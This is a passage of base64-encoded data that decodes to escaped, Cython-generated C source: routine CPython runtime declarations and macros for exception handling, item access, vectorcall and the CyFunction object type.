W1lKFB5T2JqZWN0ICpuYW1lKTtcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiNkZWZpbmUgX19QeXhfR2V0RXhjZXB0aW9uKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19HZXRFeGNlcHRpb24oX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfR2V0RXhjZXB0aW9uKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKGludCBpbl9hc3luY19nZW4pO1xuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQ2xvc3VyZU5hbWVFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQICYmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsTm9FcnJvcihvYmosIGF0dHJfbmFtZSkgIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lLCAwKVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lKSAgX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwob2JqLCBhdHRyX25hbWUsIDEpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgaW50IHdpdGhfZXJyb3IpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbE5vRXJyb3IobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihvLG4pXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwobyxuKSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKG8sbilcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKG5hbWUsIGFyZ3MsIG5hcmdzZikgUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChuYW1lLCBhcmdzLCBuYXJnc2YsIE5VTEwpXG4jZWxzZVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmKTtcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKiBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSk7XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4jZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblNhdmUodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblNhdmUoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTtcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uUmVzZXQodHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uU2F2ZSh0eXBlLCB2YWx1ZSwgdGIpICAgUHlFcnJfR2V0RXhjSW5mbyh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0V4Y2VwdGlvblJlc2V0KHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1NldEV4Y0luZm8odHlwZSwgdmFsdWUsIHRiKVxuI2VuZGlmXG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKVxcXG4gICAgKGlucGxhY2UgPyBQeU51bWJlcl9JblBsYWNlQWRkKG9wMSwgb3AyKSA6IFB5TnVtYmVyX0FkZChvcDEsIG9wMikpXG4jZW5kaWZcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0U2xpY2UoXG4gICAgICAgIFB5T2JqZWN0KiBvYmosIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLFxuICAgICAgICBQeU9iamVjdCoqIHB5X3N0YXJ0LCBQeU9iamVjdCoqIHB5X3N0b3AsIFB5T2JqZWN0KiogcHlfc2xpY2UsXG4gICAgICAgIGludCBoYXNfY3N0YXJ0LCBpbnQgaGFzX2NzdG9wLCBpbnQgd3JhcGFyb3VuZCk7XG5cblxuI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50KG8sIGksIHR5cGUsIGlzX3NpZ25lZCwgdG9fcHlfZnVuYywgaXNfbGlzdCwgd3JhcGFyb3VuZCwgYm91bmRzY2hlY2ssIGhhc19naWwpXFxcbiAgICAoX19QeXhfZml0c19QeV9zc2l6ZV90KGksIHR5cGUsIGlzX3NpZ25lZCkgP1xcXG4gICAgX19QeXhfR2V0SXRlbUludF9GYXN0KG8sIChQeV9zc2l6ZV90KWksIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrKSA6XFxcbiAgICAoaXNfbGlzdCA/IChQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW5kZXhFcnJvciwgImxpc3QgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkgOlxcXG4gICAgICAgICAgICAgICBfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMobywgdG9fcHlfZnVuYyhpKSkpKVxuI2RlZmluZSBfX1B5eF9HZXRJdGVtSW50X0xpc3QobywgaSwgdHlwZSwgaXNfc2lnbmVkLCB0b19weV9mdW5jLCBpc19saXN0LCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaywgaGFzX2dpbClcXFxuICAgIChfX1B5eF9maXRzX1B5X3NzaXplX3QoaSwgdHlwZSwgaXNfc2lnbmVkKSA/XFxcbiAgICBfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlxcXG4gICAgKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAibGlzdCBpbmRleCBvdXQgb2YgcmFuZ2UiKSwgKFB5T2JqZWN0KilOVUxMKSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0xpc3RfRmFzdChQeU9iamVjdCAqbywgUHlfc3NpemVfdCBpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnQgd3JhcGFyb3VuZCwgaW50IGJvdW5kc2NoZWNrKTtcbiNkZWZpbmUgX19QeXhfR2V0SXRlbUludF9UdXBsZShvLCBpLCB0eXBlLCBpc19zaWduZWQsIHRvX3B5X2Z1bmMsIGlzX2xpc3QsIHdyYXBhcm91bmQsIGJvdW5kc2NoZWNrLCBoYXNfZ2lsKVxcXG4gICAgKF9fUHl4X2ZpdHNfUHlfc3NpemVfdChpLCB0eXBlLCBpc19zaWduZWQpID9cXFxuICAgIF9fUHl4X0dldEl0ZW1JbnRfVHVwbGVfRmFzdChvLCAoUHlfc3NpemVfdClpLCB3cmFwYXJvdW5kLCBib3VuZHNjaGVjaykgOlxcXG4gICAgKFB5RXJyX1NldFN0cmluZyhQeUV4Y19JbmRleEVycm9yLCAidHVwbGUgaW5kZXggb3V0IG9mIHJhbmdlIiksIChQeU9iamVjdCopTlVMTCkpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMoUHlPYmplY3QgKm8sIFB5T2JqZWN0KiBqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0Zhc3QoUHlPYmplY3QgKm8sIFB5X3NzaXplX3QgaSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGlzX2xpc3QsIGludCB3cmFwYXJvdW5kLCBpbnQgYm91bmRzY2hlY2spO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKTtcblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SXRlbShQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEl0ZW0ob2JqLCBrZXkpICBQeU9iamVjdF9HZXRJdGVtKG9iaiwga2V5KVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWVxuICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcXFxuICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlxcXG4gICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSlcbiNlbGlmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcXFxuICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlxcXG4gICAgICAgIGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChzKSkgPyBQeUxvbmdfVHlwZS50cF9yZXByKHMpIDpcXFxuICAgICAgICBsaWtlbHkoUHlGbG9hdF9DaGVja0V4YWN0KHMpKSA/IFB5RmxvYXRfVHlwZS50cF9yZXByKHMpIDpcXFxuICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKHMsIGYpIChcXFxuICAgICAgICBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3QocykpID8gKFB5X0lOQ1JFRihzKSwgcykgOlxcXG4gICAgICAgIFB5T2JqZWN0X0Zvcm1hdChzLCBmKSlcbiNlbmRpZlxuXG5cbkNZVEhPTl9VTlVTRUQgc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdfQ2hlY2soUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7XG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTExcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4jZGVmaW5lIF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlciBQeU9iamVjdF9WZWN0b3JjYWxsXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIgX1B5T2JqZWN0X1ZlY3RvcmNhbGxcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIFB5VHVwbGVfTmV3KG4pXG5zdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBQeU9iamVjdCAqKmFyZ3MsIGludCBuKTtcbnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKGNvbnN0IGNoYXIgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIgX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0XG4jZGVmaW5lIF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMobikgX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKG4pXG4jZGVmaW5lIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKSBQeURpY3RfU2V0SXRlbShidWlsZGVyLCBrZXksIHZhbHVlKVxuI2RlZmluZSBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHIoa2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbikgUHlEaWN0X1NldEl0ZW1TdHJpbmcoYnVpbGRlciwga2V5LCB2YWx1ZSlcbiNlbmRpZlxuXG5cbiNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApXG4jZGVmaW5lIF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCBhbHdheXNfY2FsbCwgdmlzaXQsIGFyZykgMFxuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKFB5T2JqZWN0ICpvLCBpbnQgYWx3YXlzX2NhbGwsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKTtcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApO1xuI2VuZGlmXG5cblxuc3RhdGljIGludCBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCwgUHlPYmplY3QgKmssIFB5T2JqZWN0ICp2KTtcbiNkZWZpbmUgX19QeXhfU2V0SXRlbU9uVHlwZURpY3QodHAsIGssIHYpIF9fUHl4X19TZXRJdGVtT25UeXBlRGljdCgoUHlUeXBlT2JqZWN0Kil0cCwgaywgdilcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfZml4X3VwX2V4dGVuc2lvbl90eXBlX2Zyb21fc3BlYyhQeVR5cGVfU3BlYyAqc3BlYywgUHlUeXBlT2JqZWN0ICp0eXBlKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE5vQXJnKFB5T2JqZWN0ICpmdW5jKTtcblxuXG5zdGF0aWMgaW50IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKiptZXRob2QpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG5zdGF0aWMgaW50IF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKGNvbnN0IGNoYXIgKnR5cGVfbmFtZSwgUHlfc3NpemVfdCBkaWN0b2Zmc2V0LCBQeU9iamVjdCAqYmFzZXMpO1xuI2VuZGlmXG5cblxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9SZWFkeShQeVR5cGVPYmplY3QgKnQpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlMaXN0X1BhY2soUHlfc3NpemVfdCBuLCAuLi4pO1xuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfSW1wb3J0RnJvbShQeU9iamVjdCogbW9kdWxlLCBQeU9iamVjdCogbmFtZSk7XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSk7XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMoUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSk7XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9GZXRjaFNoYXJlZEN5dGhvbkFCSU1vZHVsZSh2b2lkKTtcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlEaWN0X1NldERlZmF1bHQoUHlPYmplY3QgKmQsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICpkZWZhdWx0X3ZhbHVlLCBpbnQgaXNfc2FmZV90eXBlKTtcblxuXG5zdGF0aWMgUHlUeXBlT2JqZWN0KiBfX1B5eF9GZXRjaENvbW1vblR5cGVGcm9tU3BlYyhQeVR5cGVPYmplY3QgKm1ldGFjbGFzcywgUHlPYmplY3QgKm1vZHVsZSwgUHlUeXBlX1NwZWMgKnNwZWMsIFB5T2JqZWN0ICpiYXNlcyk7XG5cblxuc3RhdGljIGludCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19pbml0KFB5T2JqZWN0ICptb2R1bGUpO1xuI2RlZmluZSBfX1B5eF9Db21tb25UeXBlc01ldGFjbGFzc19VU0VEXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU1ldGhvZF9OZXcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqdHlwKTtcblxuXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KTtcbiNlbmRpZlxuXG5cbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4jZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EICAweDAxXG4jZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fQ0xBU1NNRVRIT0QgICAweDAyXG4jZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTICAgICAgICAweDA0XG4jZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fQ09ST1VUSU5FICAgICAweDA4XG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xvc3VyZShmKVxcXG4gICAgKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZikpLT5mdW5jX2Nsb3N1cmUpXG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKGYpXFxcbiAgICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbGFzc29iailcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKVxcXG4gICAgICAoKFB5T2JqZWN0KikgKChQeUNNZXRob2RPYmplY3QgKikgKGYpKS0+bW1fY2xhc3MpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9TZXRDbGFzc09iaihmLCBjbGFzc29iailcXFxuICAgIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSwgKGNsYXNzb2JqKSlcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9EZWZhdWx0cyh0eXBlLCBmKVxcXG4gICAgKCh0eXBlICopKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZikpLT5kZWZhdWx0cykpXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNHZXR0ZXIoZiwgZylcXFxuICAgICgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZikpLT5kZWZhdWx0c19nZXR0ZXIgPSAoZylcbnR5cGVkZWYgc3RydWN0IHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3RfSEVBRFxuICAgIFB5T2JqZWN0ICpmdW5jO1xuI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxXG4gICAgUHlDRnVuY3Rpb25PYmplY3QgZnVuYztcbiNlbHNlXG4gICAgUHlDTWV0aG9kT2JqZWN0IGZ1bmM7XG4jZW5kaWZcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCB8fFxcXG4gICAgICAgIChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIENZVEhPTl9NRVRIX0ZBU1RDQUxMKVxuICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGZ1bmNfdmVjdG9yY2FsbDtcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqZnVuY193ZWFrcmVmbGlzdDtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpmdW5jX2RpY3Q7XG4gICAgUHlPYmplY3QgKmZ1bmNfbmFtZTtcbiAgICBQeU9iamVjdCAqZnVuY19xdWFsbmFtZTtcbiAgICBQeU9iamVjdCAqZnVuY19kb2M7XG4gICAgUHlPYmplY3QgKmZ1bmNfZ2xvYmFscztcbiAgICBQeU9iamVjdCAqZnVuY19jb2RlO1xuICAgIFB5T2JqZWN0ICpmdW5jX2Nsb3N1cmU7XG4jaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeU9iamVjdCAqZnVuY19jbGFzc29iajtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpkZWZhdWx0cztcbiAgICBpbnQgZmxhZ3M7XG4gICAgUHlPYmplY3QgKmRlZmF1bHRzX3R1cGxlO1xuICAgIFB5T2JqZWN0ICpkZWZhdWx0c19rd2RpY3Q7XG4gICAgUHlPYmplY3QgKigqZGVmYXVsdHNfZ2V0dGVyKShQeU9iamVjdCAqKTtcbiAgICBQeU9iamVjdCAqZnVuY19hbm5vdGF0aW9ucztcbiAgICBQeU9iamVjdCAqZnVuY19pc19jb3JvdXRpbmU7XG59IF9fcHl4X0N5RnVuY3Rpb25PYmplY3Q7XG4jdW5kZWYgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUpXG4jZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhvYmopICBfX1B5eF9UeXBlQ2hlY2syKG9iaiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfQ3lGdW5jdGlvblR5cGUsICZQeUNGdW5jdGlvbl9UeXBlKVxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrRXhhY3Qob2JqKSAgX19QeXhfSVNfVFlQRShvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKTtcbiN1bmRlZiBfX1B5eF9Jc1NhbWVDRnVuY3Rpb25cbiNkZWZpbmUgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKSAgIF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCogb3AsIFB5TWV0aG9kRGVmICptbCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGZsYWdzLCBQeU9iamVjdCogcXVhbG5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCAqZ2xvYmFscyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QqIGNvZGUpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiBmLCBQeU9iamVjdCogY2xhc3NvYmopO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5p